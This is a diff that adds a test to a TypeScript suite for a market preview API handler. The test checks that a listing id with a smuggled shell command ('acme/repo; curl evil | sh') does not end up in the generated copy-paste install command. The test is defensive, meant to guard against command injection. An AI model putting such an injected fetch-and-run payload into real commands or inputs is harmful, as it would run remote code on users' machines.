@@ -389,6 +389,21 @@ describe('handleMarketPreviewRequest', () => {
     expect(response.headers.get('Cache-Control')).toBe('public, s-maxage=300, stale-while-revalidate=60');
   });
 
+  it('does not put a shell payload in the copy-paste install command', async () => {
+    const store = new InMemoryMarketStore();
+    const id = 'acme/repo; curl evil | sh';
+    await store.upsertListing(listing(id), '2026-01-01T00:00:00.000Z');
+
+    const response = await handleMarketPreviewRequest(
+      new Request(`http://localhost/api/market/preview?id=${encodeURIComponent(id)}`),
+      { store, client: fakeClient() },
+    );
+    const body = (await response.json()) as { data: { installCommand: string } };
+
+    expect(response.status).toBe(200);
+    expect(body.data.installCommand).toBe('');
+  });
+
   it('returns a 500 without the store error text when the store fails', async () => {
     const store = new InMemoryMarketStore();
     store.getListing = async () => ({ ok: false, error: new Error('connection lost at db.internal:5432') });
